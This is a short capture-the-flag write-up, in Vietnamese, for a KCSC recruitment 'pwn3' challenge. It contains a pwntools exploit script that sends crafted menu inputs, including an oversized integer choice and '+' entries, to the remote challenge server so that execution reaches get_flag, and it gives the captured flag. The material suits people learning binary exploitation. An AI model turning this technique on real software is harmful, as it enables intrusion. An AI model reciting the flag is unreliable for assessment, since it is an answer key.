## write up
https://github.com/DoQuangPhu/CTF_writeups/tree/main/KCSCRECRUIT/pwn3/private
## script 
- cách làm của mình hơi khác author 1 tí đó là thay vì leak exe thì mk lợi dụng việc addr get_flag > addition, xóa tất cả các addr khác trong Robot nó sẽ tự động sort get_flag vào addition
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn3")

context.binary = exe

p = process([exe.path])
# gdb.attach(p, gdbscript = '''

# c
# ''')

# input()

p = remote('103.162.14.116', 12003)

p.sendlineafter(b'choice: \n', str(0x100000005))
p.sendlineafter(b'sort? \n', str(1))
for i in range(100):
    p.sendlineafter(b'element: ', str(1))

p.sendlineafter(b'element: ', str(1))
p.sendlineafter(b'element: ', str(1))
p.sendlineafter(b'element: ', b'+')
p.sendlineafter(b'element: ', str(1))
p.sendlineafter(b'element: ', str(1))
p.sendlineafter(b'element: ', b'+')
p.sendlineafter(b'element: ', str(-1))
p.sendlineafter(b'choice: \n', str(1))

p.interactive()

# KCSC{did_you_exploit_via_menu_return_value}
```
## Flag 
KCSC{did_you_exploit_via_menu_return_value}
